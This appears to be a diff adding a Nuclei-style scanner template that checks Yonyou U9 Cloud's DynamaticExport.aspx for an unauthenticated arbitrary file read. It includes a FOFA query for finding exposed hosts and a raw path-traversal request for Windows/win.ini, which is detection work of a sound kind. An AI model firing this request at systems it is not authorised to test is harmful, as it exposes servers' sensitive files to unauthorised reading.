@@ -1,0 +1,29 @@
+id: yongyouU9-Cloud-DynamaticExport_aspx-File-reading
+
+info:
+  name: 用友U9 Cloud DynamaticExport.aspx 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: (body="logo-u9.png" || body="/U9/css/")
+    用友U9 Cloud DynamaticExport.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s/h3Ly69Br5Zi7j70DW8APQQ
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+        condition: and
+      - type: status
+        status: 
+          - 200
